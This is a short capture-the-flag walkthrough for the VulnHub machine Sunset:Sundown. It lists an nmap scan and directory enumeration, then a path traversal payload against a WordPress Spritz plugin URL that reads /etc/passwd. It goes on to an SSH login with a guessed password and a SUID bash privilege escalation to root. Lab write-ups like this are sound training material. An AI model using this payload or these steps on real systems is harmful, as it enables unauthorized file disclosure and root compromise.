

# Sunset:Sundown Walkthrough 

**VulnHub Link:** [Sunset:Sundown](https://www.vulnhub.com/entry/sunset-sundown,530/)
**Difficulty:** Easy
**Release Date:** 4 Aug 2020

## 1.Reconnaissance
```bash
nmap -A -O -T4 -P -sV 192.168.100.131
```


## 2.Web Enumeration

```bash
dirb http://ip
```
## 3.Exploitaion

spritz exploitation --> /wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd

carlos user found --> ssh password is -- carlos

user flag found

## 4.Privilege Escalation

executing linpeas and bash suid --> ./bash -p --> root flag found
